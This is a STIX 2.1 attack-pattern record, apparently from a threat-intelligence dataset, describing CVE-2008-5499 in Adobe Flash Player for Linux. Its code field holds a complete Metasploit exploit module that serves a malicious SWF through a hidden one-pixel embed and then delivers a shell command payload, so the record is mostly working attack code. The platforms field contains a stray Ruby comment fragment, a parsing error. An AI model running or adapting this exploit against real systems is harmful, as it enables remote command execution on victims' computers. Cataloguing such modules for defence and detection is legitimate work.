{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--e5df0980-b773-4271-8a2a-39949a60cc4b",
    "created": "2024-08-14T16:57:09.909997Z",
    "modified": "2024-08-14T16:57:09.910001Z",
    "name": "Adobe Flash Player ActionScript Launch Command Execution Vulnerability",
    "description": " This module exploits a vulnerability in Adobe Flash Player for Linux version 10.0.12.36 and 9.0.151.0 and prior. An input validation vulnerability allows command execution when the browser loads a SWF file which contains shell metacharacters in the arguments to the ActionScript launch method.  The victim must have Adobe AIR installed for the exploit to work. This module was tested against version 10.0.12.36 (10r12_36).  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/browser/adobe_flashplayer_aslaunch.rb",
            "external_id": "adobe_flashplayer_aslaunch.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2008-5499"
        },
        {
            "source_name": "reference",
            "url": "http://www.adobe.com/support/security/bulletins/apsb08-24.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Adobe Flash Player ActionScript Launch Command Execution Vulnerability',\n      'Description'    => %q{\n          This module exploits a vulnerability in Adobe Flash Player for Linux,\n          version 10.0.12.36 and 9.0.151.0 and prior.\n          An input validation vulnerability allows command execution when the browser\n          loads a SWF file which contains shell metacharacters in the arguments to\n          the ActionScript launch method.\n\n          The victim must have Adobe AIR installed for the exploit to work. This module\n          was tested against version 10.0.12.36 (10r12_36).\n        },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          '0a29406d9794e4f9b30b3c5d6702c708', # Metasploit version\n        ],\n      'References'     =>\n        [\n          ['CVE', '2008-5499'],\n          ['OSVDB', '50796'],\n          ['BID', '32896'],\n          ['URL', 'http://www.adobe.com/support/security/bulletins/apsb08-24.html']\n        ],\n      'DefaultOptions' =>\n        {\n          'HTTP::compression' => 'gzip',\n          'HTTP::chunked'     => true\n        },\n      'Platform'       => 'unix', # so unix cmd exec payloads are ok\n      'Arch'           => ARCH_CMD,\n      'Targets'        =>\n        [\n          [ 'Automatic', {}],\n        ],\n      'DisclosureDate' => '2008-12-17',\n      'DefaultTarget'  => 0))\n\n  end\n\n  def exploit\n    path = File.join( Msf::Config.data_directory, \"exploits\", \"CVE-2008-5499.swf\" )\n    fd = File.open( path, \"rb\" )\n    @swf = fd.read(fd.stat.size)\n    fd.close\n\n    super\n  end\n\n  def on_request_uri(cli, request)\n    msg = \"#{cli.peerhost.ljust(16)} #{self.shortname}\"\n    trigger = @swf\n    trigger_file = rand_text_alpha(rand(6)+3) + \".swf\"\n\n    obj_id = rand_text_alpha(rand(6)+3)\n\n    if request.uri.match(/\\.swf/i)\n      print_status(\"#{msg} Sending Exploit SWF\")\n      send_response(cli, trigger, { 'Content-Type' => 'application/x-shockwave-flash' })\n      return\n    end\n\n    if request.uri.match(/\\.txt/i)\n      send_response(cli, payload.encoded, { 'Content-Type' => 'text/plain' })\n      return\n    end\n\n    html =  <<-EOS\n    <html>\n      <head>\n      </head>\n      <body>\n      <center>\n      <object classid=\"clsid:D27CDB6E-AE6D-11cf-96B8-444553540000\" id=\"#{obj_id}\" width=\"1\" height=\"1\" codebase=\"http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab\">\n        <param name=\"movie\" value=\"#{get_resource}#{trigger_file}\" />\n        <embed src=\"#{get_resource}#{trigger_file}\" quality=\"high\" width=\"1\" height=\"1\" name=\"#{obj_id}\" align=\"middle\" allowNetworking=\"all\"\n          type=\"application/x-shockwave-flash\"\n          pluginspage=\"http://www.macromedia.com/go/getflashplayer\">\n        </embed>\n\n      </object>\n    </center>\n\n    </body>\n    </html>\n    EOS\n\n    print_status(\"#{msg} Sending HTML...\")\n    send_response(cli, html, { 'Content-Type' => 'text/html' })\n  end\nend\n",
    "x_mitre_disclosure_date": "2008-12-17",
    "x_mitre_platforms": [
        "unix', # so unix cmd exec payloads are ok"
    ]
}